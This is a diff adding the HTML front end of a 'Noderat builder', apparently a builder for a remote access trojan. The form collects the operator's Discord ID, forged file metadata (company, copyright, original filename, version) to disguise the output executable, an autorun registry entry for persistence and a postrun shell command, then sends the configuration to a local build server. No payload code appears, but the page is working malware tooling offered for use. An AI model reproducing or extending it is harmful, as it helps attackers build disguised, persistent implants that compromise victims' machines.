@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link rel="stylesheet" href="http://localhost:65352/index.css">
+
+    <script src="./get_socket.io.js"></script>
+
+    
+    <script>
+        
+        //  
+        var sock=io('http://localhost:65352')
+
+        loadconfig=()=>{
+        var config=[...document.getElementById('mainconf').children]
+        config.push(...document.getElementById('meta').children)
+        config.push(...document.getElementById('advanced').children)
+        var configparsed={}
+        var ps='please specify '
+        config.forEach(e=>configparsed[e.id]=e.value)
+        var r=false
+        !configparsed.pversion?r=ps+'product version':1
+        !configparsed.product?r=ps+'product name':1
+        !configparsed.original?r=ps+'original filename':1
+        !configparsed.copyright?r=ps+'legal copyright':1
+        !configparsed.company?r=ps+'company name':1
+        !configparsed.friendly?r=ps+'friendly name':1
+        !configparsed.version?r=ps+'file version':1
+        !configparsed.dsid?r=ps+'your discord id':1
+        !configparsed.output?r= ps+'the output file':1
+        configparsed.includefiles=document.getElementById('includefiles').checked
+        if(r){return alert(r)}
+        //console.log(configparsed)
+         sock.emit('buildconf',configparsed)
+        // console.log(configparsed)
+        }
+        window.onload=()=> sock.emit('appready')
+    </script>
+    
+    <meta charset="utf-8">
+    <title class="title">Noderat builder</title>
+</head>
+<body>
+    <h3 class="title">Noderat builder</h3>
+    <div>
+        <h5 class="title" style="position: absolute;left: 30px;top: 110px;">Main configuration</h5>
+        <div id="mainconf">
+            <input id="output" type="text" placeholder="full path to output file" class="form-control" style="position:absolute;top: 150px;left:10px;width:350px;height:50px;background-color: black;color: #009B22;border: 2px solid #009B22;">
+            <input id="icofile" type="text" placeholder="full path to icon" class="form-control" style="position:absolute;top: 210px;left:10px;width:350px;height:50px;background-color: black;color: #009B22;border: 2px solid #009B22;">
+            <input id="dsid" type="text" placeholder="your discord id" class="form-control" style="position:absolute;top: 270px;left:10px;width:350px;height:50px;background-color: black;color: #009B22;border: 2px solid #009B22;">
+        </div>
+        <h5 style="position:absolute;top: 450px;left:970px;">Include additional files?</h5>
+         <button class="btn btn-primary" id="bb4"  style="border: 2px solid #009B22;position:absolute;height: 50px;top: -490px;width:350px;left: 930px;background-color: black;" onclick="sock.emit('openadditionalfiles')">Open incudes folder</button>
+        
+        <h5 class="title" style="position: absolute;left: 500px;top: 110px;">Metadata configuration</h5>
+        <div id="meta">
+        <input id="friendly" type="text" placeholder="Friendly name" class="form-control" style="position:absolute;top: 150px;left:475px;width:350px;height:50px;background-color: black;color: #009B22;border: 2px solid #009B22;">
+        <input id="company" type="text" placeholder="Company name" class="form-control" style="position:absolute;top: 210px;left:475px;width:350px;height:50px;background-color: black;color: #009B22;border: 2px solid #009B22;">
+        <input id="description" type="text" placeholder="File description" class="form-control" style="position:absolute;top: 270px;left:475px;width:350px;height:50px;background-color: black;color: #009B22;border: 2px solid #009B22;">
+        <input id="version" type="text" placeholder="File version" class="form-control" style="position:absolute;top: 330px;left:475px;width:350px;height:50px;background-color: black;color: #009B22;border: 2px solid #009B22;">
+        <input id="copyright" type="text" placeholder="Legal copyright" class="form-control" style="position:absolute;top: 390px;left:475px;width:350px;height:50px;background-color: black;color: #009B22;border: 2px solid #009B22;">
+        <input id="original" type="text" placeholder="Original filename" class="form-control" style="position:absolute;top: 450px;left:475px;width:350px;height:50px;background-color: black;color: #009B22;border: 2px solid #009B22;">
+        <input id="product" type="text" placeholder="Product name" class="form-control" style="position:absolute;top: 510px;left:475px;width:350px;height:50px;background-color: black;color: #009B22;border: 2px solid #009B22;">
+        <input id="pversion" type="text" placeholder="Product version" class="form-control" style="position:absolute;top: 570px;left:475px;width:350px;height:50px;background-color: black;color: #009B22;border: 2px solid #009B22;">
+        </div>
+        <h5 class="title" style="position: absolute;left: 970px;top: 110px;">Advanced configuration(not required))</h5>
+        <div id="advanced">
+            <input id="packname" type="text" placeholder="packaged core filename(default=nrcl.exe)" class="form-control" style="position:absolute;top: 150px;left:930px;width:350px;height:50px;background-color: black;color: #009B22;border: 2px solid #009B22;">
+            <input id="postrun" type="text" placeholder="postrun shell command" class="form-control" style="position:absolute;top: 210px;left:930px;width:350px;height:50px;background-color: black;color: #009B22;border: 2px solid #009B22;">
+            <input id="autorunre" type="text" placeholder="autorun registry entry" class="form-control" style="position:absolute;top: 270px;left:930px;width:350px;height:50px;background-color: black;color: #009B22;border: 2px solid #009B22;">
+            <input id="autoruntf" type="text" placeholder="autorun target filename" class="form-control" style="position:absolute;top: 330px;left:930px;width:350px;height:50px;background-color: black;color: #009B22;border: 2px solid #009B22;">
+            <input id="includefiles" onchange="document.getElementById('bb4').style.top=document.getElementById('includefiles').checked?'490px':'-490px'" type="checkbox" class="form-control" style="position:absolute;top: 450px;left:930px;width: 30px;height: 30px;background-color: black;color: #009B22;border: 2px solid #009B22;">
+        </div>
+        <button class="btn btn-primary" id="bb5" style="color: #009B22;border: 2px solid #009B22;position:absolute;width: 120px;height: 70px;top: 550px;width:350px;left: 10px;background-color: black;" onclick="loadconfig()">Build</button>
+        
+    
+    
+</div>
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+</body>
+</html>
